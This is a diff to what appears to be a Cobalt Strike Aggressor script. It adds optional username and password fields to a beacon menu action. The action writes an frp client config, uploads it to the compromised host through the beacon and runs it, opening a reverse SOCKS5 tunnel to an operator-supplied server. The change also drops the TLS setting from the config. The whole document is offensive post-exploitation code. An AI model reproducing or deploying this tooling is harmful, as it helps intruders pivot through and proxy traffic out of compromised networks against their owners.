@@ -1,7 +1,13 @@
 sub FRP {
-    $out = openf(">".script_resource("frpc/frpc.ini"));
-    writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\ntls_enable = true\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5");
-    closef($out);
+    if($3['USERNAME'] == "" && $3['PASSWORD'] == ""){
+        $out = openf(">".script_resource("frpc/frpc.ini"));
+        writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5");
+        closef($out);
+    }else{
+        $out = openf(">".script_resource("frpc/frpc.ini"));
+        writeb($out, "[common]\nserver_addr=".$3['IP']."\nserver_port=".$3['PORT']."\n[http_proxy]\ntype = tcp\nremote_port = ".$3['PPORT']."\nplugin = socks5\nplugin_user = ".$3['USERNAME']."\nplugin_passwd =".$3['PASSWORD']);
+        closef($out);
+    }
     bcd($bid, $3['UploadPath']);
     bupload($bid, script_resource("frpc/frpc.ini"));
     if (-is64 $bid['id']) {
@@ -21,8 +27,10 @@ popup beacon_bottom {
             drow_text($dialog, "IP",  "Server IP: ");
             drow_text($dialog, "PORT",  "Server PORT: ");
             drow_text($dialog, "PPORT",  "Proxy PORT: ");
+            drow_text($dialog, "USERNAME",  "Username:");
+            drow_text($dialog, "PASSWORD",  "Password: ");
             dbutton_action($dialog, "Upload And Run!");
             dialog_show($dialog);
         }
     }
-} 
+}
